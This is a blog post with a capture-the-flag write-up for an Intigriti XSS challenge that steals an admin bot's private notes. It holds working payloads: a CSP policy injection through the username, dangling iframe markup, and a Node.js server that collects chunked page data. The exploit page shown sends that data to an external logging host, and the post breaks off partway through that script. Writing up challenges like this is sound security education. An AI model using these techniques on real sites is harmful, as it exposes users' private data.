@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    Intigriti June 2026 Challenge
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">Intigriti June 2026 Challenge</h1>
+        <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>5 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2026-06-22
+</span>
+    </header>
+        
+        <nav aria-label="Table of contents">
+        <details>
+            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 2.5rem 0rem 0.5rem 0rem;font-size: 1.1rem;">
+            Table of Contents
+            </summary>
+            <ul>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#challenge-description">Challenge Description</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#basic-recon">Basic Recon</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#html-injection">HTML Injection</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#csp-bypass-via-username">CSP Bypass via Username</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#the-dangling-iframe-technique">The Dangling Iframe Technique</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#cross-origin-access">Cross-Origin Access</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#setting-up-the-server">Setting Up the Server</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#reporting-to-the-admin">Reporting to the Admin</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#getting-the-flag">Getting the Flag</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/intigriti-challenge-0626/#congratulations">Congratulations!</a>
+                
+                </li>
+            
+            </ul>
+        </details>
+        </nav>
+
+
+    <div itemprop="articleBody">
+      <p>Intigriti June 2026 challenge write-up. An XSS challenge with a strict CSP, the solution involves dangling markup injection to capture the admin's notes and exfiltrate the flag.</p>
+<span id="continue-reading"></span><h2 id="challenge-description">Challenge Description</h2>
+<p>You can find the challenge at <a href="https://challenge-0626.intigriti.io/">challenge-0626.intigriti.io</a>. It's a private notes app with a strict content policy. The admin bot visits any URL you report, and the flag is somewhere in the admin's notes.</p>
+<h2 id="basic-recon">Basic Recon</h2>
+<p>After registering an account and logging in, you can create notes and search through them. The search endpoint at <code>/search</code> takes three parameters: <code>q</code> (title prefix), <code>description</code>, and <code>owner</code>.</p>
+<p>The server returns a pretty strict CSP:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">default-src &#39;none&#39;; script-src &#39;nonce-...&#39;; style-src &#39;nonce-...&#39;;
+</span><span style="color:#abb2bf;">form-action &#39;self&#39;; base-uri &#39;none&#39;; report-uri /csp-report/USERNAME &lt;!-- ← CSP bypass here --&gt;
+</span></code></pre>
+<p><code>default-src 'none'</code> kills pretty much every exfiltration channel — no images, no frames, no connections, no scripts without the nonce. The only thing not controlled by CSP? <strong>Navigation</strong>.</p>
+<h2 id="html-injection">HTML Injection</h2>
+<p>Both <code>q</code> and <code>description</code> parameters are reflected in the page without encoding. The <code>description</code> shows up in two places:</p>
+<ol>
+<li>Inside a <code>&lt;meta&gt;</code> tag in the <code>&lt;head&gt;</code>:</li>
+</ol>
+<pre data-lang="html" style="background-color:#2b303b;color:#6c7079;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">meta </span><span style="color:#db9d63;">name</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;description&quot; </span><span style="color:#db9d63;">content</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;Notes search — YOUR_INPUT&quot;</span><span style="color:#abb2bf;">&gt;
+</span></code></pre>
+<ol start="2">
+<li>Inside a form <code>&lt;input&gt;</code> (HTML-encoded, can't break out).</li>
+</ol>
+<p>The <code>q</code> parameter appears as plain text at the bottom of the page:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#6c7079;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">p</span><span style="color:#abb2bf;">&gt;YOUR_QUERY not found&lt;/</span><span style="color:#eb6772;">p</span><span style="color:#abb2bf;">&gt;
+</span></code></pre>
+<p>Both allow HTML injection — break out with <code>"&gt;</code> in the <code>description</code>, or drop raw tags in the <code>q</code>.</p>
+<h2 id="csp-bypass-via-username">CSP Bypass via Username</h2>
+<p>I remembered a research article I had read before, <a href="https://portswigger.net/research/bypassing-csp-with-policy-injection">“Bypassing CSP with Policy Injection”</a> by Gareth Heyes, which was similar to this case, so I applied the same technique. And it worked!</p>
+<p>The <code>owner</code> parameter is interesting. When set to <code>.</code> or <code>;..//</code>, the app falls back to your session username. If you register with a username containing CSP directives, they get injected into the page's CSP header.</p>
+<p>Register with:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">username: machiavelli; script-src-attr &#39;unsafe-inline&#39;; img-src https://*.oastify.com/
+</span></code></pre>
+<p>Now when you visit <code>/search?q=...&amp;description=...&amp;owner=.</code>, the CSP becomes:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">default-src &#39;none&#39;; ... script-src-attr &#39;unsafe-inline&#39;; img-src https://*.oastify.com/
+</span></code></pre>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;intigriti-challenge-0626&#x2F;assets/images/csp-username-bypass.png" 
+      alt="CSP Bypass via Username" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>This gives you inline event handlers and image loading — self-XSS confirmed with:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">q=&quot;&gt;&lt;img src=&quot;https://xxx.oastify.com/x&quot; onerror=alert(1)&gt;
+</span></code></pre>
+<p>But here's the problem: the <strong>admin bot</strong> has a clean username. The admin's CSP stays strict — no <code>unsafe-inline</code>, no <code>img-src</code> bypass. Event handlers won't fire for the admin.</p>
+<h2 id="the-dangling-iframe-technique">The Dangling Iframe Technique</h2>
+<p>Since we can't execute scripts on the admin's page, we need another way to exfiltrate data. Enter <strong>dangling markup injection</strong>.</p>
+<p>The idea: inject an unclosed <code>&lt;iframe name='</code> attribute. Everything after the opening <code>'</code> until the next <code>'</code> in the page becomes the iframe's <code>name</code> attribute value. If we put the <strong>opening</strong> quote in the <code>&lt;head&gt;</code> (via <code>description</code>) and the <strong>closing</strong> quote at the bottom of the <code>&lt;body&gt;</code> (via <code>q</code>), the entire page — including admin notes — gets captured into <code>window.name</code>.</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">description=&quot;&gt;&lt;iframe name=&#39;
+</span><span style="color:#abb2bf;">q=zzqx&#39;
+</span></code></pre>
+<p>The HTML becomes:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#6c7079;" class="language-html "><code class="language-html" data-lang="html"><span style="font-style:italic;color:#5f697a;">&lt;!-- head --&gt;
+</span><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">meta </span><span style="color:#db9d63;">name</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;description&quot; </span><span style="color:#db9d63;">content</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;Notes search — &quot;</span><span style="color:#abb2bf;">&gt;&lt;</span><span style="color:#eb6772;">iframe </span><span style="color:#db9d63;">name</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&#39;&quot;&gt;
+</span><span style="color:#9acc76;">&lt;title&gt;Search — Inside Job&lt;/title&gt;
+</span><span style="color:#9acc76;">...
+</span><span style="color:#9acc76;">&lt;!-- body, admin notes --&gt;
+</span><span style="color:#9acc76;">&lt;article class=&quot;note&quot;&gt;
+</span><span style="color:#9acc76;">    &lt;strong&gt;FLAG_TITLE&lt;/strong&gt;
+</span><span style="color:#9acc76;">    &lt;p&gt;INTIGRITI{...}&lt;/p&gt;
+</span><span style="color:#9acc76;">&lt;/article&gt;
+</span><span style="color:#9acc76;">...
+</span><span style="color:#9acc76;">&lt;p&gt;zzqx&#39; </span><span style="color:#db9d63;">not found</span><span style="background-color:#e05252;color:#ffffff;">&lt;</span><span style="color:#abb2bf;">/</span><span style="color:#db9d63;">p</span><span style="color:#abb2bf;">&gt;  </span><span style="font-style:italic;color:#5f697a;">&lt;!-- ← the closing quote! --&gt;
+</span></code></pre>
+<p>The first <code>'</code> in the page source is in <code>&lt;p&gt;zzqx' not found&lt;/p&gt;</code> (the <code>q</code> input uses <code>&amp;#39;</code> which is HTML-encoded). Everything between the <code>&lt;iframe name='</code> in the head and that <code>'</code> at the bottom — all 710KB of it — becomes the iframe's <code>window.name</code>.</p>
+<h2 id="cross-origin-access">Cross-Origin Access</h2>
+<p>The dangling iframe creates a child frame of the challenge page. Its <code>window.name</code> holds the captured HTML. But we're on a different origin — how do we read it?</p>
+<p>The trick: <strong>navigate</strong> the child frame to <code>about:blank</code>. Cross-origin <strong>writes</strong> (setting <code>.location</code>) are allowed, even when reads are blocked. After navigating to <code>about:blank</code>, the child inherits <strong>our</strong> origin — and <code>window.name</code> persists across navigations.</p>
+<pre data-lang="javascript" style="background-color:#2b303b;color:#6c7079;" class="language-javascript "><code class="language-javascript" data-lang="javascript"><span style="font-style:italic;color:#5f697a;">// Access the child frame created by the dangling &lt;iframe name=&#39;...&#39;&gt;
+</span><span style="color:#cd74e8;">let </span><span style="color:#eb6772;">inner </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">f</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">contentWindow</span><span style="color:#abb2bf;">[</span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">];
+</span><span style="color:#abb2bf;">
+</span><span style="font-style:italic;color:#5f697a;">// Navigate it to about:blank (cross-origin write — allowed!)
+</span><span style="color:#eb6772;">inner</span><span style="color:#abb2bf;">.location </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;about:blank&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="font-style:italic;color:#5f697a;">// Now same-origin — read window.name
+</span><span style="color:#cd74e8;">let </span><span style="color:#eb6772;">data </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">inner</span><span style="color:#abb2bf;">.name; </span><span style="font-style:italic;color:#5f697a;">// 710KB of captured HTML
+</span></code></pre>
+<h2 id="setting-up-the-server">Setting Up the Server</h2>
+<p>We need a server that serves the exploit page. I used a VPS running Caddy as a reverse proxy:</p>
+<p><strong>Caddyfile:</strong></p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">attacker-server.example.com {
+</span><span style="color:#abb2bf;">    reverse_proxy 127.0.0.1:3000
+</span><span style="color:#abb2bf;">}
+</span></code></pre>
+<p><code>nip.io</code> is a wildcard DNS that resolves <code>IP.nip.io</code> to <code>IP</code> — this gives us proper TLS/SNI without a domain name.</p>
+<p><strong>Node.js server</strong> (<code>server.js</code>) on port 3000:</p>
+<pre data-lang="javascript" style="background-color:#2b303b;color:#6c7079;" class="language-javascript "><code class="language-javascript" data-lang="javascript"><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">http </span><span style="color:#adb7c9;">= </span><span style="color:#5ebfcc;">require</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;http&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">fs </span><span style="color:#adb7c9;">= </span><span style="color:#5ebfcc;">require</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;fs&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">path </span><span style="color:#adb7c9;">= </span><span style="color:#5ebfcc;">require</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;path&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">chunks </span><span style="color:#adb7c9;">= new </span><span style="color:#abb2bf;">Map();
+</span><span style="color:#cd74e8;">let </span><span style="color:#eb6772;">totalLen </span><span style="color:#adb7c9;">= </span><span style="color:#db9d63;">null</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">EXPLOIT_HTML </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">fs</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">readFileSync</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">path</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">join</span><span style="color:#abb2bf;">(__dirname, </span><span style="color:#9acc76;">&#39;exploit.html&#39;</span><span style="color:#abb2bf;">), </span><span style="color:#9acc76;">&#39;utf8&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">function </span><span style="color:#5cb3fa;">maybeFinalize</span><span style="color:#abb2bf;">() {
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">totalLen </span><span style="color:#adb7c9;">=== </span><span style="color:#db9d63;">null</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">got </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">[</span><span style="color:#adb7c9;">...</span><span style="color:#eb6772;">chunks</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">values</span><span style="color:#abb2bf;">()].</span><span style="color:#5cb3fa;">reduce</span><span style="color:#abb2bf;">((</span><span style="color:#eb6772;">a</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">b</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#eb6772;">a </span><span style="color:#adb7c9;">+ </span><span style="color:#eb6772;">b</span><span style="color:#abb2bf;">.length, </span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">got </span><span style="color:#adb7c9;">&lt; </span><span style="color:#eb6772;">totalLen</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">return</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">data </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">[</span><span style="color:#adb7c9;">...</span><span style="color:#eb6772;">chunks</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">keys</span><span style="color:#abb2bf;">()].</span><span style="color:#5ebfcc;">sort</span><span style="color:#abb2bf;">((</span><span style="color:#eb6772;">a</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">b</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#eb6772;">a </span><span style="color:#adb7c9;">- </span><span style="color:#eb6772;">b</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">    .</span><span style="color:#5cb3fa;">map</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">k </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#eb6772;">chunks</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">get</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">k</span><span style="color:#abb2bf;">)).</span><span style="color:#5ebfcc;">join</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">decoded </span><span style="color:#adb7c9;">= </span><span style="color:#5ebfcc;">decodeURIComponent</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">data</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">m </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">decoded</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">match</span><span style="color:#abb2bf;">(</span><span style="color:#5ebfcc;">/INTIGRITI\{</span><span style="color:#db9d63;">[</span><span style="color:#adb7c9;">^</span><span style="color:#db9d63;">}]</span><span style="color:#adb7c9;">+</span><span style="color:#5ebfcc;">\}/</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#f0c678;">console</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">log</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;FLAG:&#39;</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">m </span><span style="color:#adb7c9;">? </span><span style="color:#eb6772;">m</span><span style="color:#abb2bf;">[</span><span style="color:#db9d63;">0</span><span style="color:#abb2bf;">] </span><span style="color:#adb7c9;">: </span><span style="color:#9acc76;">&#39;not found&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">fs</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">writeFileSync</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;dump-&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#f0c678;">Date</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">now</span><span style="color:#abb2bf;">() </span><span style="color:#adb7c9;">+ </span><span style="color:#9acc76;">&#39;.html&#39;</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">decoded</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">}
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">http</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">createServer</span><span style="color:#abb2bf;">((</span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">) </span><span style="color:#cd74e8;">=&gt; </span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">setHeader</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;Access-Control-Allow-Origin&#39;</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;*&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">url </span><span style="color:#adb7c9;">=== </span><span style="color:#9acc76;">&#39;/&#39; </span><span style="color:#adb7c9;">|| </span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">url </span><span style="color:#adb7c9;">=== </span><span style="color:#9acc76;">&#39;/exploit.html&#39;</span><span style="color:#abb2bf;">) {
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">writeHead</span><span style="color:#abb2bf;">(</span><span style="color:#db9d63;">200</span><span style="color:#abb2bf;">, { </span><span style="color:#9acc76;">&#39;Content-Type&#39;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&#39;text/html; charset=utf-8&#39; </span><span style="color:#abb2bf;">});
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">return </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">end</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">EXPLOIT_HTML</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">url</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">startsWith</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;/log&#39;</span><span style="color:#abb2bf;">)) {
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">u </span><span style="color:#adb7c9;">= new </span><span style="color:#abb2bf;">URL(</span><span style="color:#9acc76;">&#39;http://x&#39; </span><span style="color:#adb7c9;">+ </span><span style="color:#eb6772;">req</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">url</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">u</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">searchParams</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">has</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;len&#39;</span><span style="color:#abb2bf;">)) {
+</span><span style="color:#abb2bf;">      </span><span style="color:#eb6772;">chunks</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">clear</span><span style="color:#abb2bf;">();
+</span><span style="color:#abb2bf;">      </span><span style="color:#eb6772;">totalLen </span><span style="color:#adb7c9;">= +</span><span style="color:#eb6772;">u</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">searchParams</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">get</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;len&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">u</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">searchParams</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">has</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;i&#39;</span><span style="color:#abb2bf;">)) {
+</span><span style="color:#abb2bf;">      </span><span style="color:#eb6772;">chunks</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">set</span><span style="color:#abb2bf;">(</span><span style="color:#adb7c9;">+</span><span style="color:#eb6772;">u</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">searchParams</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">get</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;i&#39;</span><span style="color:#abb2bf;">), </span><span style="color:#eb6772;">u</span><span style="color:#abb2bf;">.</span><span style="color:#eb6772;">searchParams</span><span style="color:#abb2bf;">.</span><span style="color:#5ebfcc;">get</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;d&#39;</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">|| </span><span style="color:#9acc76;">&#39;&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">      </span><span style="color:#5cb3fa;">maybeFinalize</span><span style="color:#abb2bf;">();
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">return </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">end</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;ok&#39;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">writeHead</span><span style="color:#abb2bf;">(</span><span style="color:#db9d63;">404</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">res</span><span style="color:#abb2bf;">.</span><span style="color:#5cb3fa;">end</span><span style="color:#abb2bf;">();
+</span><span style="color:#abb2bf;">}).</span><span style="color:#5cb3fa;">listen</span><span style="color:#abb2bf;">(</span><span style="color:#db9d63;">3000</span><span style="color:#abb2bf;">, </span><span style="color:#9acc76;">&#39;127.0.0.1&#39;</span><span style="color:#abb2bf;">);
+</span></code></pre>
+<p><strong>The exploit page</strong> (<code>exploit.html</code>):</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#6c7079;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#abb2bf;">&lt;!doctype html&gt;
+</span><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">html</span><span style="color:#abb2bf;">&gt;
+</span><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">head</span><span style="color:#abb2bf;">&gt;&lt;</span><span style="color:#eb6772;">meta </span><span style="color:#db9d63;">charset</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;utf-8&quot;</span><span style="color:#abb2bf;">&gt;&lt;</span><span style="color:#eb6772;">title</span><span style="color:#abb2bf;">&gt;exploit&lt;/</span><span style="color:#eb6772;">title</span><span style="color:#abb2bf;">&gt;&lt;/</span><span style="color:#eb6772;">head</span><span style="color:#abb2bf;">&gt;
+</span><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">body</span><span style="color:#abb2bf;">&gt;
+</span><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">script</span><span style="color:#abb2bf;">&gt;
+</span><span style="color:#abb2bf;">(</span><span style="color:#cd74e8;">function </span><span style="color:#abb2bf;">() {
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">LOG </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;https://xxx.oastify.com&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#eb6772;">OWNER </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;admin&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#adb7c9;">inj = </span><span style="color:#9acc76;">&#39;&quot;&gt;&lt;iframe name=</span><span style="color:#5ebfcc;">\&#39;</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#cd74e8;">const </span><span style="color:#adb7c9;">f = </span><span style="color:#abb2bf;">document.</span><span style="color:#eb6772;">createElement</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;iframe&#39;</span><span style="color:#abb2bf;">);
